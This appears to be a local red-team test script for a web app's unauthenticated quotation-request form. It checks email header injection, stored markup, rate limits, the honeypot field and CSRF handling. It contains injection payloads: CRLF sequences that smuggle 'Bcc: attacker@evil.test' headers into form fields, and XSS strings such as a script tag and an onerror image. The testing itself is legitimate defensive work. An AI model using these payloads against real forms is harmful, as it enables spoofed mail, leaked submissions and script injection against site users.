"""Red-team 2026-10-14: unauthenticated POST /apply (quotation request) -- header/CRLF injection into the notice email,
rate limits, honeypot, stored markup. LOCAL ONLY. Needs a throw-away SMTP sink on 127.0.0.1:$SINK_PORT (default 2525), e.g.
    python3.11 -m smtpd -c DebuggingServer -n 127.0.0.1:2525      (nothing leaves the machine)"""
import os, re, sqlite3, sys, tempfile
from pathlib import Path
ROOT = Path(__file__).resolve().parent.parent; sys.path.insert(0, str(ROOT))
db = Path(tempfile.mkdtemp())/"s.db"
os.environ.update({"AMLKIT_DB": str(db), "AMLKIT_SMTP_HOST": "127.0.0.1", "AMLKIT_SMTP_PORT": os.environ.get("SINK_PORT", "2525"), "AMLKIT_SMTP_USE_TLS": "0", "AMLKIT_QUOTE_TO": "sales@example.test", "AMLKIT_REGISTRATION_INVITE_CODE": "test-invite"})
import logging; logging.disable(logging.CRITICAL)
from fastapi.testclient import TestClient
from amlkit import auth
from amlkit.api.app import app, limiter
from amlkit.cases import applications as A
limiter.reset(); cl = TestClient(app, follow_redirects=False, raise_server_exceptions=False)
def base(**over):
    f = {"applicant_type": "Single entity", "client_firms": "", "org_name": "Acme LLC", "category": A.CATEGORIES[0], "jurisdiction": A.JURISDICTIONS[0],
         "contact_name": "Jane Doe", "job_title": "MLRO", "email": "jane@acme.ae", "phone": "+971 50 000 0000", "team_size": A.TEAM_SIZES[0],
         "customers_per_year": A.CUSTOMERS_PER_YEAR[0], "consent": "on", "message": "hello", "company_website": ""}
    f.update(over); return f
def post(**over):
    cl.get("/apply"); f = base(**over); f["csrf_token"] = cl.cookies.get(auth.CSRF_COOKIE)
    return cl.post("/apply", data=f)
def rows(): 
    try: return sqlite3.connect(db).execute("select id, org_name, contact_name, email from applications order by id").fetchall()
    except Exception as e: return str(e)
print("== 1. CRLF / header-injection attempts (SMTP sink receives the real notice) ==")
for label, over in [("CRLF + Bcc in org_name", {"org_name": "Acme\r\nBcc: attacker@evil.test"}), ("CRLF + Bcc in contact_name", {"contact_name": "Jane\r\nBcc: attacker@evil.test"}),
                    ("CRLF + Bcc in email", {"email": "jane@acme.ae\r\nBcc: attacker@evil.test"}), ("quoted-local-part email trick", {"email": '"x@y.com>,<attacker@evil.test"@acme.ae'}),
                    ("comma list in email", {"email": "jane@acme.ae,attacker@evil.test"}), ("RLO + markup in names", {"org_name": "Acme‮<script>alert(1)</script>", "contact_name": "<img src=x onerror=alert(1)>"}),
                    ("message with header-like lines", {"message": "x\r\nBcc: attacker@evil.test\r\n\r\nSubject: spoof"}), ("2000-char fields", {"org_name": "A"*5000, "message": "B"*50000})]:
    limiter.reset(); r = post(**over); print(f" {label:34s} -> {r.status_code} {r.headers.get('location','')}")
print(" stored rows:", rows())
print("== 2. rate limits (5/hour, 30/day per IP) and honeypot ==")
limiter.reset(); codes = [post(contact_name=f"R{i}").status_code for i in range(7)]; print(" 7 valid submissions:", codes)
limiter.reset(); n0 = len(rows()); r = post(company_website="http://bot.test"); print(" honeypot filled ->", r.status_code, r.headers.get("location"), "| new rows:", len(rows()) - n0)
r = cl.post("/apply", data=dict(base(), csrf_token="")); print(" no CSRF token ->", r.status_code, "| rows unchanged:", len(rows()) == n0)
